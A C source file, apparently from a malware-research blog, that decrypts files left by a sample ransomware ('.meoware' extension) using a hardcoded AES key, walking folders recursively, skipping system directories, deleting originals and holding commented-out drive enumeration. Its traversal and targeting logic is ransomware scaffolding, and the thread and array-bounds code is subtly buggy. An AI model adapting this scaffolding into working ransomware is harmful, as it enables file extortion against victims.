/*
 * hack-aes-decryptor-original.c
 * Ransomware AES decryption
 * save original extension
 * author @cocomelonc
*/

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <process.h>
#include <stdbool.h>

#define AES_BLOCK_SIZE 16
#define IN_CHUNK_SIZE (AES_BLOCK_SIZE * 10)
#define OUT_CHUNK_SIZE (IN_CHUNK_SIZE * 2)
#define MAX_THREADS 8  // Adjust as needed
#define MAX_FOLDERS 26
#define MAX_PATH_LENGTH 260

// we do not encrypt sensitive folders and files
const char* blacklistDirectories[] = {
  "C:\\Windows\\",
  "C:\\Program Files (x86)\\",
  "C:\\Program Files\\",
  "C:\\ProgramData\\",
  "Z:\\",
};

// Structure to hold data for each thread
struct ThreadData {
  const char* inputFile;
  const char* outputFile;
  const BYTE* aesKey;
};

void decryptFile(const char* inputFile, const char* outputFile, const BYTE* aesKey) {
  HCRYPTPROV hCryptProv = NULL;
  HCRYPTKEY hKey = NULL;
  HCRYPTHASH hHash = NULL;
  HANDLE hInputFile = INVALID_HANDLE_VALUE;
  HANDLE hOutputFile = INVALID_HANDLE_VALUE;
  BYTE* chunk = NULL;
  BOOL success = FALSE;

  // Open input file for reading
  hInputFile = CreateFileA(inputFile, GENERIC_READ, FILE_SHARE_READ, NULL, 
                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hInputFile == INVALID_HANDLE_VALUE) {
      printf("Error opening input file %s: %d\n", inputFile, GetLastError());
      goto cleanup;
  }

  // Create output file for writing
  hOutputFile = CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, 
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hOutputFile == INVALID_HANDLE_VALUE) {
      printf("Error creating output file %s: %d\n", outputFile, GetLastError());
      goto cleanup;
  }

  // Initialize crypto provider
  if (!CryptAcquireContextA(&hCryptProv, NULL, MS_ENH_RSA_AES_PROV_A, 
                          PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
      printf("CryptAcquireContext failed: %d\n", GetLastError());
      goto cleanup;
  }

  // Create hash object
  if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
      printf("CryptCreateHash failed: %d\n", GetLastError());
      goto cleanup;
  }

  // Hash the key
  if (!CryptHashData(hHash, aesKey, (DWORD)strlen((const char*)aesKey), 0)) {
      printf("CryptHashData failed: %d\n", GetLastError());
      goto cleanup;
  }

  // Derive the key
  if (!CryptDeriveKey(hCryptProv, CALG_AES_128, hHash, 0, &hKey)) {
      printf("CryptDeriveKey failed: %d\n", GetLastError());
      goto cleanup;
  }

  // Allocate buffer for file chunks
  chunk = (BYTE*)malloc(IN_CHUNK_SIZE);
  if (!chunk) {
      printf("Memory allocation failed\n");
      goto cleanup;
  }

  // Get file size
  LARGE_INTEGER fileSize;
  if (!GetFileSizeEx(hInputFile, &fileSize)) {
      printf("GetFileSize failed: %d\n", GetLastError());
      goto cleanup;
  }

  // Decrypt file in chunks
  DWORD bytesRead = 0;
  DWORD totalRead = 0;
  BOOL isFinal = FALSE;
  
  while (ReadFile(hInputFile, chunk, IN_CHUNK_SIZE, &bytesRead, NULL) && bytesRead > 0) {
      totalRead += bytesRead;
      isFinal = (totalRead >= fileSize.QuadPart);

      DWORD chunkLen = bytesRead;
      if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &chunkLen)) {
          printf("CryptDecrypt failed: %d\n", GetLastError());
          goto cleanup;
      }

      DWORD bytesWritten = 0;
      if (!WriteFile(hOutputFile, chunk, chunkLen, &bytesWritten, NULL) || bytesWritten != chunkLen) {
          printf("WriteFile failed: %d\n", GetLastError());
          goto cleanup;
      }
  }

  // Close all handles before file operations
  if (hKey) CryptDestroyKey(hKey);
  if (hHash) CryptDestroyHash(hHash);
  if (hCryptProv) CryptReleaseContext(hCryptProv, 0);
  if (hInputFile != INVALID_HANDLE_VALUE) CloseHandle(hInputFile);
  if (hOutputFile != INVALID_HANDLE_VALUE) CloseHandle(hOutputFile);
  hKey = NULL;
  hHash = NULL;
  hCryptProv = NULL;
  hInputFile = INVALID_HANDLE_VALUE;
  hOutputFile = INVALID_HANDLE_VALUE;

  // Delete the original file
  if (!DeleteFileA(inputFile)) {
      printf("Error deleting original file %s: %d\n", inputFile, GetLastError());
      goto cleanup;
  }

  // Rename the decrypted file to original name
  if (!MoveFileA(outputFile, inputFile)) {
      printf("Error renaming decrypted file %s to %s: %d\n", 
            outputFile, inputFile, GetLastError());
      goto cleanup;
  }

  success = TRUE;

cleanup:
  if (!success) {
      // Clean up partially decrypted file if operation failed
      if (hOutputFile != INVALID_HANDLE_VALUE) {
          CloseHandle(hOutputFile);
          DeleteFileA(outputFile);
      }
  }

  if (chunk) free(chunk);
  if (hKey) CryptDestroyKey(hKey);
  if (hHash) CryptDestroyHash(hHash);
  if (hCryptProv) CryptReleaseContext(hCryptProv, 0);
  if (hInputFile != INVALID_HANDLE_VALUE) CloseHandle(hInputFile);
  if (hOutputFile != INVALID_HANDLE_VALUE) CloseHandle(hOutputFile);
}

// encryption function to be called by each thread
unsigned __stdcall decryptFileThread(void* args) {
  struct ThreadData* threadData = (struct ThreadData*)args;
  decryptFile(threadData->inputFile, threadData->outputFile, threadData->aesKey);
  return 0;
}

void decryptFiles(const char* folderPath, const BYTE* key) {
  WIN32_FIND_DATAA findFileData;
  char searchPath[MAX_PATH];
  sprintf_s(searchPath, MAX_PATH, "%s\\*", folderPath);

  HANDLE hFind = FindFirstFileA(searchPath, &findFileData);

  if (hFind == INVALID_HANDLE_VALUE) {
    printf("Error: %d\n", GetLastError());
    return;
  }

  HANDLE threadHandles[MAX_THREADS];
  int threadCount = 0;

  do {
    const char* fileName = findFileData.cFileName;

    if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
      continue;
    }

    char filePath[MAX_PATH];
    sprintf_s(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);

    int isBlacklisted = 0;
    for (int i = 0; i < MAX_PATH_LENGTH; ++i) {
      if (blacklistDirectories[i] != NULL && strstr(filePath, blacklistDirectories[i]) != NULL) {
        isBlacklisted = 1;
        break;
      }
    }

    if (!isBlacklisted) {
      if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        // Recursive call for subfolders
        decryptFiles(filePath, key);
      } else {
        // Process individual files
        if (strstr(fileName, ".meoware") != NULL) {
          printf("File: %s\n", filePath);
          char decryptedFilePath[MAX_PATH];
          sprintf_s(decryptedFilePath, MAX_PATH, "%s.decrypted", filePath);
          // decryptFile(filePath, decryptedFilePath, key);
          struct ThreadData threadData = { filePath, decryptedFilePath, key };

          // Start a new thread
          threadHandles[threadCount] = (HANDLE)_beginthreadex(NULL, 0, &decryptFileThread, (void*)&threadData, 0, NULL);
          if (threadHandles[threadCount] == 0) {
            printf("error creating thread\n");
            return;
          }

          threadCount++;

          // Wait for threads to finish before processing the next file
          if (threadCount == MAX_THREADS) {
            WaitForMultipleObjects(threadCount, threadHandles, TRUE, INFINITE);

            // Close thread handles
            for (int i = 0; i < threadCount; i++) {
              CloseHandle(threadHandles[i]);
            }

            threadCount = 0;
          }
          printf("File decrypt: %s OK!\n", filePath);
        }
      }
    }

  } while (FindNextFileA(hFind, &findFileData) != 0);

  // Wait for remaining threads to finish
  WaitForMultipleObjects(threadCount, threadHandles, TRUE, INFINITE);

  // Close thread handles
  for (int i = 0; i < threadCount; i++) {
    CloseHandle(threadHandles[i]);
  }

  FindClose(hFind);
}

void enumerateDrives(char folders[][MAX_PATH_LENGTH], int* folderCount) {
  DWORD drives = GetLogicalDrives();
  char drive[] = "A:\\";
  int driveType;

  for (int i = 0; i < 26; ++i) {
    if (drives & 1) {
      drive[0] = 'A' + i;
      driveType = GetDriveTypeA(drive);

      if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE) {
        int isBlacklisted = 0;
        for (int j = 0; j < MAX_PATH_LENGTH; ++j) {
          if (blacklistDirectories[j] != NULL && strstr(drive, blacklistDirectories[j]) != NULL) {
            isBlacklisted = 1;
            break;
          }
        }

        if (!isBlacklisted) {
          strcpy_s(folders[*folderCount], drive);
          (*folderCount)++;
        }
      }
    }
    drives >>= 1;
  }
}

int main() {
  const char* rootFolder = "C:\\Users\\user1\\Desktop\\books";
  const char* privateKey = "mymy16ByteKey12";
  decryptFiles(rootFolder, privateKey);
  // char folders[MAX_FOLDERS][MAX_PATH];
  // int folderCount = 0;
  // enumerateDrives(folders, &folderCount);
  // // encrypt the enumerated folders
  // printf("Enumerated Folders:\n");
  // for (int i = 0; i < folderCount; ++i) {
  //   printf("%s\n", folders[i]);
  //   decryptFiles(folders[i], privateKey);
  // }
  return 0;
}